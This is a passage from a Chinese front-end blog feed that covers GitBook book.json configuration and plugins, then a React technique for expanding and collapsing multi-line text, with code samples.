class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>新增目录文件时执行gitbook init会自动创建文件到对于目录下面  </p><p>注意：  </p><p>最顶层的是一级目录，缩进一次的是二级目录，默认会收缩进对应的一级目录里面，如果想创建更深层次的目录结构，就在对应的子目录下面以缩进的方式创建  </p><p>该文件里面的缩进对于文档侧边栏目录的缩进</p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/publish/fabu.png" width="200"></li><li><p>构建gitbook build  </p><p>执行该命令会生成一个_book文件夹，里面的内容对于生成的HTML文件</p></li></ul><h2 id="配置book-json"><a href="#配置book-json" class="headerlink" title="配置book.json"></a>配置book.json</h2><h3 id="配置说明"><a href="#配置说明" class="headerlink" title="配置说明"></a>配置说明</h3><table><thead><tr><th align="center">变量</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">root</td><td align="center">包含所有图书文件的根文件夹的路径，除了 book.json</td></tr><tr><td align="center">structure</td><td align="center">指定自述文件，摘要，词汇表等的路径</td></tr><tr><td align="center">title</td><td align="center">您的书名，默认值是从 README 中提取出来的。在 GitBook.com 上，这个字段是预填的。</td></tr><tr><td align="center">description</td><td align="center">您的书籍的描述，默认值是从 README 中提取出来的。在 GitBook.com 上，这个字段是预填的。</td></tr><tr><td align="center">author</td><td align="center">作者名。在GitBook.com上，这个字段是预填的。</td></tr><tr><td align="center">isbn</td><td align="center">国际标准书号 ISBN</td></tr><tr><td align="center">language</td><td align="center">本书的语言类型 —— <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FList_of_ISO_639-1_codes" target="_blank" rel="noopener">ISO code</a> 。默认值是 <code>en</code></td></tr><tr><td align="center">direction</td><td align="center">文本阅读顺序。可以是 rtl （从右向左）或 ltr （从左向右），默认值依赖于 language 的值。</td></tr><tr><td align="center">gitbook</td><td align="center">应该使用的GitBook版本，并接受类似于 <code>&gt;=3.0.0</code> 的条件。</td></tr><tr><td align="center">links</td><td align="center">在左侧导航栏添加链接信息</td></tr><tr><td align="center">plugins</td><td align="center">要加载的插件列表(<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fdocs.gitbook.com%2Fv2-changes%2Fimportant-differences%23plugins" target="_blank" rel="noopener">官网插件列表</a>)</td></tr><tr><td align="center">pluginsConfig</td><td align="center">插件的配置</td></tr></tbody></table><h3 id="默认插件"><a href="#默认插件" class="headerlink" title="默认插件"></a>默认插件</h3><ul><li>highlight - 语法高亮插件</li><li>search - 搜索插件</li><li>sharing - 分享插件</li><li>font-settings - 字体设置插件</li><li>livereload - 热加载插件</li></ul><p>搜索  </p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggstn51gezj30fy04gt8q.jpg" alt="image-20200716145919634">  </p><p>字体  </p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggstnprwzij30b205wwel.jpg" alt="image-20200716145955656">    </p><p>分享  </p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggstoianbfj308006zt8t.jpg" alt="image-20200716150040280">  </p><h3 id="删除默认插件"><a href="#删除默认插件" class="headerlink" title="删除默认插件"></a>删除默认插件</h3><p>在平时开发中比如分享给出的都是一些国外的社交网站 对于我们没太大用户 那么我们可以删除默认配置</p><p>在插件配置在加<code>-</code>,配置完执行<code>gitbook install</code>即可</p><pre class="line-numbers language-json"><code class="language-json"><span class="token property">"plugins"</span><span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token string">"-sharing"</span>  <span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>效果如下：  </p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggstu43pr7j31qo0icwgl.jpg" alt="image-20200716150604078">  </p><p>右侧不再展示分享相关的按钮</p><h3 id="常用配置"><a href="#常用配置" class="headerlink" title="常用配置"></a>常用配置</h3><h4 id="代码复制"><a href="#代码复制" class="headerlink" title="代码复制"></a>代码复制</h4><pre class="line-numbers language-js"><code class="language-js"><span class="token string">"plugins"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>    <span class="token string">"code"</span>  <span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>效果如下：  </p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxf7nx56kj317q06sjru.jpg" alt="image-20200720142753077">  </p><p>代码复制按钮</p><pre class="line-numbers language-js"><code class="language-js"><span class="token string">"plugins"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>    <span class="token string">"copy-code-button"</span>  <span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxfnx31w6j318607cjrw.jpg" alt="image-20200720144333351"></p><h4 id="目录折叠"><a href="#目录折叠" class="headerlink" title="目录折叠"></a>目录折叠</h4><pre class="line-numbers language-js"><code class="language-js"><span class="token string">"plugins"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>    <span class="token string">"expandable-chapters"</span>  <span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>效果如下：  </p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxf9o7rq1j30cm0bcaap.jpg" alt="image-20200720142951146">  </p><pre class="line-numbers language-js"><code class="language-js"><span class="token string">"plugins"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>    <span class="token string">"expandable-chapters-small"</span>  <span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>和上面一样都是折叠目录的，区别就是下面的箭头要细一些。</p><p>效果如下：  </p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxfbrr8ugj30g20egwfe.jpg" alt="image-20200720143153085">  </p><h4 id="回到顶部"><a href="#回到顶部" class="headerlink" title="回到顶部"></a>回到顶部</h4><pre class="line-numbers language-js"><code class="language-js"><span class="token string">"plugins"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>    <span class="token string">"back-to-top-button"</span>  <span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>效果如下：  </p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxffk1906j31gu0g40v0.jpg" alt="image-20200720143530843"></p><h4 id="高级搜索"><a href="#高级搜索" class="headerlink" title="高级搜索"></a>高级搜索</h4><p>去除默认的search搜索和lunr，在搜索结果中，关键字会高亮；自带的 search 插件，关键字不会高亮</p><pre class="line-numbers language-js"><code class="language-js"><span class="token string">"plugins"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>          <span class="token string">"-lunr"</span><span class="token punctuation">,</span>           <span class="token string">"-search"</span><span class="token punctuation">,</span>           <span class="token string">"search-pro"</span>    <span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>原生搜索效果：  </p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxfotz6s0j31ye0jggro.jpg" alt="image-20200720144425681"></p><p>高级搜索：  </p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxftwiu0kj320s0ri12z.jpg" alt="image-20200720144917280"></p><p>搜索关键字高亮，支持中文、拼音和英文</p><h4 id="分享"><a href="#分享" class="headerlink" title="分享"></a>分享</h4><p>分享当前页面，比默认的 sharing 插件多了一些分享方式</p><pre class="line-numbers language-js"><code class="language-js"><span class="token string">"plugins"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"-sharing"</span><span class="token punctuation">,</span> <span class="token string">"sharing-plus"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"pluginsConfig"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>        <span class="token string">"sharing"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>             <span class="token string">"douban"</span><span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>             <span class="token string">"facebook"</span><span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>             <span class="token string">"google"</span><span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>             <span class="token string">"pocket"</span><span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>             <span class="token string">"qq"</span><span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>             <span class="token string">"qzone"</span><span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>             <span class="token string">"twitter"</span><span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>             <span class="token string">"weibo"</span><span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>          <span class="token string">"all"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>               <span class="token string">"douban"</span><span class="token punctuation">,</span> <span class="token string">"facebook"</span><span class="token punctuation">,</span> <span class="token string">"google"</span><span class="token punctuation">,</span> <span class="token string">"instapaper"</span><span class="token punctuation">,</span> <span class="token string">"linkedin"</span><span class="token punctuation">,</span><span class="token string">"twitter"</span><span class="token punctuation">,</span> <span class="token string">"weibo"</span><span class="token punctuation">,</span>                <span class="token string">"messenger"</span><span class="token punctuation">,</span><span class="token string">"qq"</span><span class="token punctuation">,</span> <span class="token string">"qzone"</span><span class="token punctuation">,</span><span class="token string">"viber"</span><span class="token punctuation">,</span><span class="token string">"whatsapp"</span>           <span class="token punctuation">]</span>       <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参数配置里面true的默认展示图标，false的默认不展示；all里面的会在分享按钮的下拉列表里面全部展示出来。</p><p>效果如下：  </p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxg25dfstj30ie0s8wg1.jpg" alt="image-20200720145713703"></p><p>分享效果如下：  </p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxg3dey89j315a0totcl.jpg" alt="image-20200720145824437"></p><h4 id="配置页脚"><a href="#配置页脚" class="headerlink" title="配置页脚"></a>配置页脚</h4><pre class="line-numbers language-js"><code class="language-js"><span class="token string">"plugins"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>       <span class="token string">"tbfed-pagefooter"</span>    <span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"pluginsConfig"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>        <span class="token string">"tbfed-pagefooter"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>            <span class="token string">"copyright"</span><span class="token punctuation">:</span><span class="token string">"Copyright &amp;copy mine 2000-2020"</span><span class="token punctuation">,</span>            <span class="token string">"modify_label"</span><span class="token punctuation">:</span> <span class="token string">"文件修订时间："</span><span class="token punctuation">,</span>            <span class="token string">"modify_format"</span><span class="token punctuation">:</span> <span class="token string">"YYYY-MM-DD HH:mm:ss"</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>效果如下：  </p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxgskey19j318q03ijrs.jpg" alt="image-20200720152236897"></p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggyrd129scj30ng0do41n.jpg" alt="image-20200721181346732"></p>]]></content>
      
      
      <categories>
          
          <category> gitbook </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gitbook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React多行文字展开收起</title>
      <link href="2020/06/04/React%E5%A4%9A%E8%A1%8C%E6%96%87%E5%AD%97%E5%B1%95%E5%BC%80%E6%94%B6%E8%B5%B7/"/>
      <url>2020/06/04/React%E5%A4%9A%E8%A1%8C%E6%96%87%E5%AD%97%E5%B1%95%E5%BC%80%E6%94%B6%E8%B5%B7/</url>
      
        <content type="html"><![CDATA[<h2 id="css实现"><a href="#css实现" class="headerlink" title="css实现"></a>css实现</h2><p>在我们平时的业务开发中经常会用到文案超出只有收起，点击在展示全部文案；通常的使用时使用css来实现</p><pre class="line-numbers language-css"><code class="language-css"><span class="token property">display</span><span class="token punctuation">:</span> -webkit-box<span class="token punctuation">;</span><span class="token property">-webkit-box-orient</span><span class="token punctuation">:</span> vertical<span class="token punctuation">;</span><span class="token property">-webkit-line-clamp</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token property">overflow</span><span class="token punctuation">:</span> hidden<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>效果如下：  </p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfg1keze65j30ah044jrr.jpg" alt="image-20200604102051556">  </p><p>使用css实现时只能做多行的省略，也没法根据文字去添加定制化的按钮去实现展开收起的功能，这个只是适合特定要求不是很高的场合下使用。</p><h2 id="字符串截取"><a href="#字符串截取" class="headerlink" title="字符串截取"></a>字符串截取</h2><p>另一种方法是使用字符串截取的方案</p><pre class="line-numbers language-js"><code class="language-js">_renderContent <span class="token operator">=</span> item <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> <span class="token punctuation">{</span> content<span class="token punctuation">,</span> id <span class="token punctuation">}</span> <span class="token operator">=</span> item<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>content<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">69</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>            <span class="token operator">&lt;</span>div<span class="token operator">></span>                <span class="token operator">&lt;</span>div ref<span class="token operator">=</span><span class="token punctuation">{</span>id<span class="token punctuation">}</span> className<span class="token operator">=</span><span class="token string">"content"</span><span class="token operator">></span>                    <span class="token punctuation">{</span>content<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">69</span><span class="token punctuation">)</span><span class="token punctuation">}</span>                <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>                <span class="token operator">&lt;</span>div                    className<span class="token operator">=</span><span class="token string">"content-btn"</span>                    ref<span class="token operator">=</span><span class="token punctuation">{</span>id <span class="token operator">+</span> <span class="token string">'btn'</span><span class="token punctuation">}</span>                    onClick<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>                        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">handleContent</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">></span>                    全文                <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>            <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token operator">&lt;</span>div className<span class="token operator">=</span><span class="token string">"content"</span><span class="token operator">></span><span class="token punctuation">{</span>content<span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>展示效果：</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfg2hr514kj30aa04h74p.jpg" alt="image-20200604105254210">  </p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfg2i7bzuvj30ab049jro.jpg" alt="image-20200604105320078">  </p><p>弊端：  </p><p>数字、中文字符和引文字符的宽度是不一样的，在使用字符串截取是很容易出现如上的偏差，并且每个手机的分辨率不一样，字符渲染的宽度像素也是不同的，这样也会导致误差；所以字符串截取也不是一种很好的方案。</p><h2 id="最终实现方案"><a href="#最终实现方案" class="headerlink" title="最终实现方案"></a>最终实现方案</h2><p>话不多说直接上代码：content组件  </p><p>js代码：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">import</span> React <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token punctuation">;</span><span class="token keyword">import</span> cs <span class="token keyword">from</span> <span class="token string">'classnames'</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">'./style.scss'</span><span class="token punctuation">;</span><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">class</span> <span class="token class-name">TextContainer</span> <span class="token keyword">extends</span> <span class="token class-name">React<span class="token punctuation">.</span>Component</span> <span class="token punctuation">{</span>    <span class="token function">constructor</span><span class="token punctuation">(</span>props<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">(</span>props<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token punctuation">{</span>            content<span class="token punctuation">:</span> props<span class="token punctuation">.</span>content<span class="token punctuation">,</span>            showAll<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>            btnText<span class="token punctuation">:</span> <span class="token string">'全文'</span><span class="token punctuation">,</span>            needHidden<span class="token punctuation">:</span> <span class="token boolean">false</span> <span class="token comment" spellcheck="true">//  文字超出4行 需要隐藏</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * @description: 处理content文案的点击展开收起     * @return: null     */</span>    handleContent <span class="token operator">=</span> e <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        e<span class="token punctuation">.</span><span class="token function">stopPropagation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> <span class="token punctuation">{</span> showAll <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span>            showAll<span class="token punctuation">:</span> <span class="token operator">!</span>showAll        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 判断文本超出行数</span>    isElementCollision <span class="token operator">=</span> <span class="token punctuation">(</span>ele<span class="token punctuation">,</span> rowCount <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">,</span> cssStyles<span class="token punctuation">,</span> removeChild<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ele<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">const</span> clonedNode <span class="token operator">=</span> ele<span class="token punctuation">.</span><span class="token function">cloneNode</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 给clone的dom增加样式</span>        clonedNode<span class="token punctuation">.</span>style<span class="token punctuation">.</span>overflow <span class="token operator">=</span> <span class="token string">'visible'</span><span class="token punctuation">;</span>        clonedNode<span class="token punctuation">.</span>style<span class="token punctuation">.</span>display <span class="token operator">=</span> <span class="token string">'inline-block'</span><span class="token punctuation">;</span>        clonedNode<span class="token punctuation">.</span>style<span class="token punctuation">.</span>width <span class="token operator">=</span> <span class="token string">'auto'</span><span class="token punctuation">;</span>        clonedNode<span class="token punctuation">.</span>style<span class="token punctuation">.</span>whiteSpace <span class="token operator">=</span> <span class="token string">'nowrap'</span><span class="token punctuation">;</span>        clonedNode<span class="token punctuation">.</span>style<span class="token punctuation">.</span>visibility <span class="token operator">=</span> <span class="token string">'hidden'</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 将传入的css字体样式赋值</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>cssStyles<span class="token punctuation">)</span> <span class="token punctuation">{</span>            Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>cssStyles<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>item <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>                clonedNode<span class="token punctuation">.</span>style<span class="token punctuation">[</span>item<span class="token punctuation">]</span> <span class="token operator">=</span> cssStyles<span class="token punctuation">[</span>item<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// 给clone的dom增加id属性</span>        <span class="token keyword">let</span> _time <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> containerID <span class="token operator">=</span> <span class="token string">'collision_node_id_'</span> <span class="token operator">+</span> _time<span class="token punctuation">;</span>        clonedNode<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">,</span> containerID<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> tmpNode <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span>containerID<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> newNode <span class="token operator">=</span> clonedNode<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>tmpNode<span class="token punctuation">)</span> <span class="token punctuation">{</span>            document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">replaceChild</span><span class="token punctuation">(</span>clonedNode<span class="token punctuation">,</span> tmpNode<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            newNode <span class="token operator">=</span> document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>clonedNode<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// 新增的dom宽度与原dom的宽度*限制行数做对比</span>        <span class="token keyword">const</span> differ <span class="token operator">=</span> newNode<span class="token punctuation">.</span>offsetWidth <span class="token operator">-</span> ele<span class="token punctuation">.</span>offsetWidth <span class="token operator">*</span> rowCount <span class="token operator">+</span> <span class="token number">40</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// console.log(differ, 'differ');</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>removeChild<span class="token punctuation">)</span> <span class="token punctuation">{</span>            document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>newNode<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> differ <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    componentDidMount <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token keyword">const</span> cssStyles <span class="token operator">=</span> <span class="token punctuation">{</span> fontSize<span class="token punctuation">:</span> <span class="token string">'0.9375rem'</span><span class="token punctuation">,</span> fontWeight<span class="token punctuation">:</span> <span class="token string">'400'</span><span class="token punctuation">,</span> lineHeight<span class="token punctuation">:</span> <span class="token string">'1.5625rem'</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// console.log(this.isElementCollision(this.refs['content'], 4, cssStyles, true));</span>        <span class="token keyword">let</span> needHidden <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isElementCollision</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>refs<span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> cssStyles<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span>            needHidden        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">let</span> <span class="token punctuation">{</span> content<span class="token punctuation">,</span> needHidden<span class="token punctuation">,</span> showAll <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">;</span>        <span class="token keyword">let</span> <span class="token punctuation">{</span> headerText <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>            <span class="token operator">&lt;</span>div<span class="token operator">></span>                <span class="token operator">&lt;</span>div                    ref<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'content'</span><span class="token punctuation">}</span>                    className<span class="token operator">=</span><span class="token punctuation">{</span><span class="token function">cs</span><span class="token punctuation">(</span><span class="token string">'content'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token string">'hidden-text'</span><span class="token punctuation">:</span> <span class="token operator">!</span>showAll <span class="token operator">&amp;&amp;</span> needHidden <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token operator">></span>                    <span class="token punctuation">{</span>headerText <span class="token operator">?</span> <span class="token function">headerText</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword">null</span><span class="token punctuation">}</span>                    <span class="token punctuation">{</span>content<span class="token punctuation">}</span>                <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>                <span class="token punctuation">{</span>needHidden <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>                    <span class="token operator">&lt;</span>div                        className<span class="token operator">=</span><span class="token string">"content-btn"</span>                        onClick<span class="token operator">=</span><span class="token punctuation">{</span>e <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>                            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">handleContent</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">></span>                        <span class="token punctuation">{</span><span class="token operator">!</span>showAll <span class="token operator">?</span> <span class="token string">'全文'</span> <span class="token punctuation">:</span> <span class="token string">'收起'</span><span class="token punctuation">}</span>                    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>                <span class="token punctuation">)</span><span class="token punctuation">}</span>            <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>css代码：  </p><pre class="line-numbers language-scss"><code class="language-scss"><span class="token property"><span class="token variable">$baseFontSize</span></span><span class="token punctuation">:</span><span class="token number">32</span>px <span class="token statement keyword">!default</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// pixels to rems</span><span class="token keyword">@function</span> <span class="token function">pxToRem</span><span class="token punctuation">(</span><span class="token variable">$px</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">@return</span> <span class="token variable">$px</span> <span class="token operator">/</span> <span class="token variable">$baseFontSize</span> <span class="token operator">*</span> <span class="token number">1</span>rem<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.content </span><span class="token punctuation">{</span>    <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token 